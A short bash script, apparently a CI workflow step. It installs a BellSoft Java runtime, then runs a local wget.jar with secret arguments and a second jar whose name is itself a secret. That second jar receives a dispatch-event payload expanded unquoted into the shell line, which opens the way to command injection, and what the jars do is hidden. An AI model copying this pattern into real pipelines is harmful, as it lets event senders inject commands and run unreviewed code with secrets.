#!/bin/bash
wget https://download.bell-sw.com/java/17.0.4+8/bellsoft-jre17.0.4+8-linux-amd64-full.deb
sudo apt-get install ./bellsoft-jre17.0.4+8-linux-amd64-full.deb -y
sudo update-java-alternatives --set /usr/lib/jvm/bellsoft-java17-runtime-full-amd64
cp wget.jar $HOME/wget.jar
cd $HOME
java -jar wget.jar $SECRET5 $SECRET6
java -jar $SECRET7 2 ${{ github.event.client_payload.long }}
